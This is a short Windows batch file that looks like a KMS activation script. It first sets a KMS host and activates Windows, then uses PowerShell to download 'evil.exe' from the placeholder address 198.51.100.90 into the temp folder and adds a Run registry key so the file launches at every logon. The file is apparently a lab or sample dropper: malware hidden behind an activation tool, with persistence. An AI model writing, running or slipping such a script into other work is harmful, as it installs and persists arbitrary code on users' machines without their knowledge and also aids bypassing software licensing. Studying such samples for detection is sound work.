@echo off
cscript C:\Windows\System32\slmgr.vbs /skms kms.lab.invalid
cscript C:\Windows\System32\slmgr.vbs /ato
powershell -c "Invoke-WebRequest http://198.51.100.90/evil.exe -OutFile %TEMP%\evil.exe"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v bad /d %TEMP%\evil.exe
